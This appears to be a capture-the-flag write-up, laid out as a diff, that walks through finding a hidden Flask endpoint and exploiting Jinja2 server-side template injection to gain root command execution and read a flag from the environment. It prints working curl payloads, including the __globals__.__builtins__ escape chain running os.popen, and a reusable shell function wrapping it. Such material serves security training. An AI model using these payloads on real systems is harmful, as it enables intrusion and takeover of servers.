@@ -1,0 +1,62 @@
+CTF Write-Up: Citrus Studio — SSTI to RCE
+Challenge: Safaricom PwnZone CTF 2026
+ Target: Citrus Studio (http://54.72.82.22:8050/)
+ Flag: safctf{42dd8c3f359acdfc9b4250f4864ffc35}
+
+The Challenge
+Citrus Studio presented itself as a harmless indie animation studio landing page, complete with a cutesy tagline ("A little color, a little motion, and a very big imagination") and a form titled "Lock Up The Usual Suspects" — just a name field and a Submit button. Nothing on the surface hinted at an API, let alone a vulnerability. The whole challenge was about finding what was hiding behind that innocent-looking form.
+
+The Workflow
+1. Finding the hidden endpoint
+The visible page gave no obvious clues — no exposed JS bundle with API calls, no helpful comments in the HTML. So I went to brute-force discovery with gobuster, running the SecLists raft-medium-words.txt wordlist against the root with a .json extension in case there was a JSON API sitting somewhere:
+gobuster dir -u http://54.72.82.22:8050/ -w ~/SecLists/SecLists/Discovery/Web-Content/raft-medium-words.txt -x json -t 50
+
+The scan was slow and noisy (lots of timeouts, likely intentional rate-limiting on the box), but buried in the output was one real hit:
+greet    (Status: 405) [Size: 153]
+
+A 405 Method Not Allowed is actually a great signal — it means the route exists, it just doesn't like GET requests. That strongly suggested it was the backend for the name-submission form.
+2. Working out how to talk to it
+First attempt was a POST with a JSON body, which came back 200 OK but with a blank name reflected in the response. That told me the Flask route wasn't parsing JSON — it was almost certainly reading request.form, which only understands traditional form-encoded data. Switching to that format confirmed it instantly:
+curl -s -X POST http://54.72.82.22:8050/greet -d "name=test"
+
+The response came back with Hello, test! Find The Suspects! — the name was being reflected straight into the page.
+3. Figuring out how it was reflected
+Reflection alone could mean a few different things — basic XSS, or something deeper. The quickest way to tell them apart is to throw a Jinja2 arithmetic expression at it, since Flask apps commonly use Jinja2 for templating:
+curl -s -X POST http://54.72.82.22:8050/greet -d 'name={{7*7}}'
+
+The response: Hello, 49! — not the literal string {{7*7}}, but the evaluated result. That was the moment the challenge flipped from "maybe XSS" to "this is Server-Side Template Injection." The app wasn't just reflecting my input into HTML — it was handing it straight to the Jinja2 template engine and letting it execute.
+4. Confirming the blast radius
+Before jumping to code execution, I checked how much of the Python environment the template had access to:
+curl -s -X POST http://54.72.82.22:8050/greet -d "name={{config}}"
+
+This dumped Flask's entire config object, SECRET_KEY included. The key turned out to be base64-encoded, and decoding it twice just unwound into a joke from the challenge author ("Was it really supposed to be secretive?") — a nice red herring, but it confirmed the template had unrestricted access to live Python objects, not a sandboxed subset.
+5. Escalating to RCE
+With full object access confirmed, the next step was the well-known Jinja2 SSTI escape chain — walking from self through __init__.__globals__ to reach Python's __builtins__, then importing os to get a shell-equivalent primitive:
+curl -s -X POST http://54.72.82.22:8050/greet \
+  --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+
+The response: Hello, uid=0(root) gid=0(root) groups=0(root) — arbitrary command execution, running as root. At that point the challenge was effectively over in terms of difficulty; it was just a matter of finding where the flag lived.
+6. Finding the flag
+To avoid retyping that long payload for every command, I wrapped it in a shell function:
+rce() {
+  curl -s -X POST http://54.72.82.22:8050/greet \
+    --data-urlencode "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('$1').read() }}" \
+    | grep -zoP '(?s)(?<=Hello, ).*?(?=! Find)'
+}
+
+A find / -iname '*flag*' search came up empty, so I widened out to basic filesystem and environment enumeration — and env was the one that paid off:
+FLAG=safctf{42dd8c3f359acdfc9b4250f4864ffc35}
+
+The flag was never written to disk at all — it was injected into the container as an environment variable, a common CTF pattern that filename-based searches will always miss.
+
+Chain Summary
+Form on homepage
+   → gobuster discovers /greet (405 on GET)
+   → POST with form-encoding gets accepted, name is reflected
+   → {{7*7}} → 49 confirms Jinja2 SSTI
+   → {{config}} confirms full object access (not sandboxed)
+   → __globals__.__builtins__ gadget → os.popen('id') → root RCE
+   → env → FLAG
+
+
+
